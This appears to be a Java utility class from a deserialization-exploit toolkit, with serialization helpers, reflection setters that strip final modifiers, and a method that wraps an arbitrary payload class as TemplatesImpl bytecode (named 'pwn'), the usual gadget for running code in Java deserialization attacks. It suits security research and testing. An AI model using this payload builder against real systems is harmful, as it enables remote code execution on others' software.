package util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class Utils {

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byteArrayOutputStream.flush();
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    public static void serialize(Object obj, File file) throws IOException {
        if (!file.exists()) {
            file.createNewFile();
        }

        FileOutputStream fileOutputStream = new FileOutputStream(file);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        fileOutputStream.flush();
        objectOutputStream.flush();
    }

    public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        Object obj = null;
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        try {
            obj = objectInputStream.readObject();
        } catch (ClassNotFoundException classNotFoundException) {
            classNotFoundException.printStackTrace();
            throw new ClassNotFoundException("Error:[Class Not Found]");
        }
        return obj;
    }

    public static Object deserialize(File file) throws IOException, ClassNotFoundException {
        Object obj = null;
        byte[] bytes = readAllLines(file);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        try {
            obj = objectInputStream.readObject();
        } catch (ClassNotFoundException classNotFoundException) {
            classNotFoundException.printStackTrace();
            throw new ClassNotFoundException("Error:[Class Not Found]");
        }
        return obj;
    }

    public static byte[] readAllLines(File file) throws IOException {
        byte[] buffer = new byte[(int) file.length()];
        FileInputStream fileInputStream = new FileInputStream(file);
        fileInputStream.read(buffer);
        fileInputStream.close();
        return buffer;
    }

    public static String ins2Str(InputStream inputStream) throws IOException {
        Scanner scanner = new Scanner(inputStream).useDelimiter("//A");
        return scanner.hasNext() ? scanner.next() : "";
    }

    public static byte[] ins2Byte(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len = 0;
        while ((len = inputStream.read(buffer, 0, buffer.length)) != -1) {
            byteArrayOutputStream.write(buffer, 0, len);
        }
        return byteArrayOutputStream.toByteArray();
    }

    public static void setFieldValue(Object obj, String field, Object value) throws Exception {
        Class<?> clazz = Class.forName(obj.getClass().getName());
        Field field1 = clazz.getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }

    public static void setFinalFieldValue(Object obj, String field, Object value) throws Exception {
        Class<?> clazz = Class.forName(obj.getClass().getName());
        Field declaredField = clazz.getDeclaredField(field);
        declaredField.setAccessible(true);

        Field modifiers = Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(declaredField, declaredField.getModifiers() & ~Modifier.FINAL);

        declaredField.set(obj, value);
    }

    public static TemplatesImpl creatTemplatesImpl(Class payloadClass) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payloadClass));
        CtClass clazz = pool.get(payloadClass.getName());
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytecodes = clazz.toBytecode();
        // templatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "pwn");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }

    public static String string2Unicode(String str) {
        StringBuilder unicode = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            char c = str.charAt(i);
            unicode.append("\\u").append(Integer.toHexString(c));
        }
        return unicode.toString();
    }

    public static String toHexString(int i) {
        String hexStr = Integer.toHexString(i);
        if (hexStr.length() % 2 != 0) {
            hexStr = "0" + hexStr;
        }
        return hexStr;
    }
}
